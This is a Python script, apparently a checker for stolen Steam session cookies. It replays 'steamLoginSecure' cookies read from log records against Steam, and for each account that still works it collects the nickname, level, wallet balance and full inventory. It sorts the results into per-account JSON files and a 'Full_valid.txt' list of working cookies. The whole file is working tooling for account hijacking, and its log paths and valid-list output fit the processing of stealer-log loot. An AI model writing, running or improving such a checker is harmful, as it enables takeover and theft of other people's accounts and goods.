# -*- coding: utf-8 -*-
import StandartMethod
import re
import random
import time
import requests
from bs4 import BeautifulSoup
import lxml
import os
import sys
import json
class steam_checker():


    @staticmethod
    def create_all_list_log(path_log: str, cook: str, path: str, link: str, lvl: str, balans: str):
        with open(path_log, 'a', encoding='utf-8') as file:
            file.write(f'Link: {link} | Balans: {balans} | Lvl: {lvl}\n'
                       f'Cookie: {cook}\n'
                       f'{path}' + "\n\n")

    @staticmethod
    def create_file(create_path: str, cook: str, path: str, link: str, lvl: str, nick: str, balans: str, resoult_inventory: dict):
        name_file = link.split('/')[-1].replace('/', '').replace('?', '').replace('<', '').replace('>','').replace('|', '').replace(':', '')
        data = {
            'Path': path,
            'Cookie': cook,
            'Account Info': {
                'Nick': nick,
                'Link': link,
                'Lvl': lvl,
                'Balans': balans,
                'Inventory': resoult_inventory
            }
        }
        try:
            with open(f'{create_path}\\{name_file} - {balans} - {lvl}.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
        except:
            with open(f'{create_path}\\{cook[:7:]} - {balans} - {lvl}.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)

    @staticmethod
    def checker(dict, account, path_log):
        headers = StandartMethod.StandartMetod.get_headers()
        StandartMethod.StandartMetod.create_file_all_list(f'{dict}')

        account_cook_login = str(account['steamLoginSecure']).replace('%', '||')
        cook = {
            "steamLoginSecure": account_cook_login,
        }

        req = requests.get('https://store.steampowered.com', cookies=cook, headers=headers)
        soup = BeautifulSoup(req.text, 'lxml')


        try:
            link = soup.find('a', class_='popup_menu_item notification_ctn header_notification_items').get('href').split('/inventory')[0]
            req = requests.get(link, cookies=cook, headers=headers)
            soup = BeautifulSoup(req.text, 'lxml')
            lvl = soup.find('div', class_='profile_header_badgeinfo_badge_area').find('span',
                                                                                      class_='friendPlayerLevelNum').text
            nick = soup.find('span', class_='actual_persona_name').text
            balans = soup.find('a', id='header_wallet_balance').text
            req = requests.get(link + '/inventory/', headers=headers, cookies=cook)
            soup = BeautifulSoup(req.text, 'lxml')
            game = soup.find('div', 'games_list_tabs').find_all('a')
            resoult_inventory = {}
            for i in game:
                data = {
                    'Count': str(i.find('span', class_='games_list_tab_number').text).strip('\'').strip('(').strip(')'),
                    'id': str(i.get('href')).replace('#', '')
                }
                resoult_inventory[i.find('span', class_='games_list_tab_name').text] = data
            account_id = re.findall(r"g_steamID = \"(.*?)\"", req.text)[0].strip()
            try:
                name_dict = f"{dict}\\"+link.split('/')[-1].replace('/', '').replace('?', '').replace('<', '').replace('>','').replace('|', '').replace(':', '') + f'({balans}) - {lvl}'
                os.mkdir(name_dict)
                os.mkdir(name_dict+'\\inventory')
            except:
                pass
            for i in resoult_inventory.items():
                req = requests.get(
                    f'https://steamcommunity.com/inventory/{account_id}/{i[1]["id"]}/2?l=russian&count={i[1]["Count"]}')
                name = str(i[0]).replace('\\', '').replace('/', '').replace('?', '').replace('<', '').replace('>','').replace('|', '').replace(':', '')
                with open(f'{name_dict }\\inventory\\{name} - {i[1]["Count"]}.json', 'w', encoding='utf-8') as outfile:
                    json.dump(req.json(), outfile, indent=4, ensure_ascii=False)
            steam_checker.create_file(name_dict,account_cook_login, path_log, link, lvl, nick, balans, resoult_inventory)
            steam_checker.create_all_list_log(f'{dict}\\Full_valid.txt',account_cook_login, path_log, link, lvl, balans)


        except Exception as ex:
            pass